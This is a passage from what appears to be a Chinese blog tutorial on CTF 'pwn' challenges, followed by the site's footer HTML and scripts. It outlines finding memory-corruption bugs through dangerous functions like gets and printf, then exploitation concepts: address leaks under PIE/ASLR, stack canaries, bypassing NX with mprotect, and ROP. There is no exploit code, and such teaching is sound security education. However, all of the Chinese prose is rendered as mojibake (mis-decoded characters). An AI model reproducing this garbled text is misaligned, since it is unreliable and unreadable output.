<p>é¦–å…ˆæŠŠå‡½æ•°åã€å˜é‡ç­‰ç­‰ææˆè‡ªå·±çœ‹å¾—æ‡‚çš„åœ°æ­¥ã€‚å¦‚æœæœ‰ç»“æ„ä½“ï¼Œæœ€å¥½èŠ±æ—¶é—´å»ºä¸€ä¸ªç»“æ„ä½“,è¿™æ ·ä¹‹ååˆ†æçœäº‹ã€‚</p></blockquote>
<h3 id="ç¬¬ä¸‰æ­¥æ‰¾åˆ°æ¼æ´æ ˆå †getså‡½æ•°systemexecv">ç¬¬ä¸‰æ­¥ã€æ‰¾åˆ°æ¼æ´ï¼ˆæ ˆï¼Ÿå †ï¼Ÿgetså‡½æ•°ã€systemã€execvï¼‰
</h3><blockquote class="alert alert-warn">
    <blockquote>
<p>æ‰¾æ¼æ´æ˜¯å¾ˆè€ƒéªŒç»éªŒçš„ã€‚</p>
<p>ä¸€èˆ¬å…ˆåˆ†æä¸€ä¸‹å±é™©å‡½æ•°ï¼Œæ¯”å¦‚<code>gets</code>ã€<code>read</code>ã€<code>write</code>ã€<code>free</code>ã€<code>printf</code>ç­‰ç­‰ã€‚
å¾ˆå¤šPWNé¢˜ç›®ä¼šè‡ªå·±å°è£…ä¸€ä¸ª<code>input</code>å‡½æ•°,é‡ç‚¹åˆ†æä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¶Šç•Œã€‚
åˆ†æçš„æ—¶å€™ä¹Ÿæœ‰æŠ€å·§ï¼Œé€šå¸¸æˆ‘ä»¬è¦çœ‹çœ‹æˆ‘ä»¬çš„è¾“å…¥æ•°æ®ä¼šè¢«ç¨‹åºå¦‚ä½•å¤„ç†ã€‚</p>
<p>ç”±äºpwnå¤šæ•°æ˜¯<strong>å†…å­˜ç ´åæ¼æ´</strong>ï¼Œæ‰€ä»¥å¯¹äºå†…å­˜æ‹·è´ç­‰å‡½æ•°è¦æ ¼å¤–æ³¨æ„ã€‚</p></blockquote></blockquote>
<h3 id="ç¬¬å››æ­¥æ¼æ´åˆ©ç”¨å†™exppayload">ç¬¬å››æ­¥ã€æ¼æ´åˆ©ç”¨ï¼ˆå†™expã€payloadï¼‰
</h3><blockquote>
<p>åŸºæœ¬ä¸Šæ‰¾åˆ°æ¼æ´å·¥ä½œå°±å®Œæˆäº†ä¸€åŠã€‚
æ¼æ´åˆ©ç”¨å’Œç¨‹åºæœ¬èº«çš„é€»è¾‘ä»¥åŠä¿æŠ¤æœºåˆ¶æ¯æ¯ç›¸å…³ã€‚é€šå¸¸æ¥è¯´ï¼Œéœ€è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>
<h4 id="åœ°å€é—®é¢˜"><strong>åœ°å€é—®é¢˜</strong>
</h4><p>æˆ‘ä»¬ç¼–å†™EXPç¦»ä¸å¼€å‡½æ•°åœ°å€ä»¥åŠgadgetsåœ°å€ã€‚</p>
<p>å¼€å¯äº†PIEå’ŒASLRï¼Œæˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•æ³„æ¼åœ°å€ã€‚</p>
<p>æ³„æ¼æ–¹æ³•ä¸€èˆ¬å°±æ˜¯è®©ç¨‹åºæ‰“å°å‡ºæ¥ä¸€äº›è„æ•°æ®æˆ–è€…å‡½æ•°åœ°å€ã€‚</p>
<p>ç¨‹åºåŸºåœ°å€ã€å †åœ°å€ã€IibcåŸºåœ°å€ã€æ ˆåœ°å€ã€‚</p>
<h4 id="canaryå’Œnxé—®é¢˜"><strong>canaryå’ŒNXé—®é¢˜</strong>
</h4><p>å¦‚æœç¡®å®šæ˜¯æ ˆé¢˜ï¼Œå¹¶ä¸”æœ‰canaryï¼Œé‚£ä¹ˆé€šå¸¸è€ƒè™‘æ³„æ¼æˆ–è€…ä¿®æ”¹canaryã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒNXéƒ½æ˜¯å¼€å¯çš„ï¼Œæ²¡æœ‰å¼€å¯å°±è¯´æ˜è¦ä½ æ‰§è¡Œ<code>shellcode</code>äº†ã€‚</p>
<p>NXå¯¹äºæˆ‘ä»¬å†™ROPåŸºæœ¬æ²¡å½±å“ï¼Œç»•è¿‡æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼š<code>mprotect</code></p>
<h4 id="ç¨‹åºæœ¬èº«çš„é™åˆ¶">ç¨‹åºæœ¬èº«çš„é™åˆ¶
</h4><p>gadgetç§ç±»å°‘ã€è¾“å…¥å­—ç¬¦æœ‰é™åˆ¶ã€æ ˆæº¢å‡ºå­—èŠ‚ä¸å¤Ÿã€å…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚</p></blockquote>
<h2 id="å®Œç»“">å®Œç»“
</h2><p>æ ˆçš„è®²è§£å°±åˆ°è¿™ï¼Œå¯èƒ½å†…å®¹æ¯”è¾ƒå°‘ï¼Œæ¦‚å¿µæŠ½è±¡äº›ï¼Œä¹Ÿæ˜¯æ€ªå°ç”ŸåŸºç¡€ä¸ç‰¢ç†è§£åŠ›ä¸å¤Ÿå¼ºğŸ˜„ï¼Œè¿˜å¾—åŒºçœ‹çœ‹PWBé¢˜åŠ å¼ºä¸€ä¸‹ã€‚</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-09-25
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/pwn-3/">
        
        
            <div class="article-image">
                <img src="/p/pwn-3/PWN3.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-3"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-3</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-1/">
        
        
            <div class="article-image">
                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-1"
                        
                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-1</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/ctfshow-pwn-writeup/">
        
        
            <div class="article-image">
                <img src="/p/ctfshow-pwn-writeup/ctfshow.8c2a966268b078c807772be02e985309_hu_9b3814b0af84762b.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ctfshow-pwn-writeup"
                        
                        data-hash="md5-jCqWYmiweMgHdyvgLphTCQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-pwn-writeup</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/misc/">
        
        

        <div class="article-details">
            <h2 class="article-title">MISC</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        























        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†7ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±161.41k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
